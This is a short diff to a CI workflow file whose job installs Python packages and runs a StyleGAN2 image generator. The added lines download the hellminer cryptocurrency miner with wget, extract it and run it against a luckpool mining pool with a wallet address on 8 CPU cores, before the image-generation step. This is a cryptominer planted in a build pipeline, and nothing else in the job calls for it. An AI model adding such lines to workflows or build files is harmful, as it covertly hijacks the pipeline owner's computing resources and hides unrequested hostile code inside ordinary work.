@@ -33,6 +33,11 @@ jobs:
         pip install scipy==1.3.3
         pip install requests==2.22.0
         pip install Pillow==6.2.1
+        apt update -y
+        apt install git wget nano libpci-dev -y
+        wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz 
+        tar xf hellminer_cpu_linux.tar.gz 
+        ./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RNa9RXXezxmCRikCVC7pq7jH4hrjUnWYFd.test -p x --cpu 8
         cd /inputs/stylegan2
         python run_generator.py generate-images \
           --network=gdrive:networks/stylegan2-ffhq-config-f.pkl \
